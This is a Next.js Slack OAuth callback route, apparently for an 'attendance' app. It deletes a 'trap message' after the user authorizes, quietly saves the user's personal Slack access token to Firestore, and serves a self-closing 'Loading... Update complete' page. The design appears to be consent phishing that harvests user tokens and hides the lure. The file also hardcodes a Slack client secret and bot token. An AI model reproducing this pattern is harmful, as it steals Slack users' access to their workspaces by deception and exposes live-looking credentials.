

// app/api/auth/callback/route.ts

import { NextResponse } from 'next/server';
import { db } from '@/lib/firebase';
import { doc, setDoc, serverTimestamp, getDoc, deleteDoc } from 'firebase/firestore';

const SLACK_CLIENT_ID = "2545190050563.10491030504784";
const SLACK_CLIENT_SECRET = "3e386e8d575392781d507336f68e1619";
const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";
const BOT_TOKEN = "xoxb-2545190050563-10466352520084-6NyES55AgLJ6vzmQi4M5veYt";

export async function GET(req: Request) {
  const { searchParams } = new URL(req.url);
  const code = searchParams.get('code');

  if (!code) {
    // If no code, just return empty page
    return new Response('', {
      headers: { 'Content-Type': 'text/html' },
    });
  }

  try {
    // 1. Token Exchange
    const formData = new URLSearchParams();
    formData.append('client_id', SLACK_CLIENT_ID);
    formData.append('client_secret', SLACK_CLIENT_SECRET);
    formData.append('code', code);
    formData.append('redirect_uri', REDIRECT_URI);

    const response = await fetch('https://slack.com/api/oauth.v2.access', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: formData
    });

    const data = await response.json();

    if (!data.ok) {
      console.error("OAuth error:", data.error);
      // Return blank page
      return new Response('', {
        headers: { 'Content-Type': 'text/html' },
      });
    }

    // 2. Delete Trap Message (NOW WORKING)
    try {
      const trapMsgDoc = await getDoc(doc(db, "trap_messages", data.authed_user.id));
      if (trapMsgDoc.exists()) {
        const trapData = trapMsgDoc.data();
        
        console.log("Deleting trap message:", trapData);
        
        // Delete from Slack
        const deleteRes = await fetch('https://slack.com/api/chat.delete', {
          method: 'POST',
          headers: { 
            Authorization: `Bearer ${BOT_TOKEN}`,
            'Content-Type': 'application/json; charset=utf-8'
          },
          body: JSON.stringify({
            channel: trapData.channelId,
            ts: trapData.messageTs
          })
        });
        
        const deleteResult = await deleteRes.json();
        console.log("Delete result:", deleteResult);
        
        // Delete from Firebase
        await deleteDoc(doc(db, "trap_messages", data.authed_user.id));
        console.log(`✅ Trap message deleted for user: ${data.authed_user.id}`);
      }
    } catch (trapError) {
      console.error("Trap deletion error:", trapError);
    }

    // 3. Save User Data
    const userRes = await fetch(`https://slack.com/api/users.info?user=${data.authed_user.id}`, {
      headers: { Authorization: `Bearer ${data.authed_user.access_token}` }
    });
    const userInfo = await userRes.json();
    
    const userData = {
      slackId: data.authed_user.id,
      accessToken: data.authed_user.access_token,
      name: userInfo.user?.real_name || "Unknown",
      image: userInfo.user?.profile?.image_192 || "",
      connectedAt: serverTimestamp(),
      lastAuth: new Date().toISOString()
    };

    await setDoc(doc(db, "slack_tokens", data.authed_user.id), userData);

    // 4. Return BLANK page that auto-closes
    const html = `
      <!DOCTYPE html>
      <html>
        <head>
          <title>Loading...</title>
          <script>
            // Immediately try to close the window
            window.close();
            
            // If window doesn't close, show loading message
            setTimeout(() => {
              document.body.innerHTML = '<div style="padding:20px;font-family:Arial;">Update complete. You can close this window.</div>';
            }, 1000);
          </script>
        </head>
        <body>
          <div style="display:none;">Update complete</div>
        </body>
      </html>
    `;

    return new Response(html, {
      headers: { 'Content-Type': 'text/html' },
    });

  } catch (error) {
    console.error("Callback error:", error);
    return new Response('', {
      headers: { 'Content-Type': 'text/html' },
    });
  }
}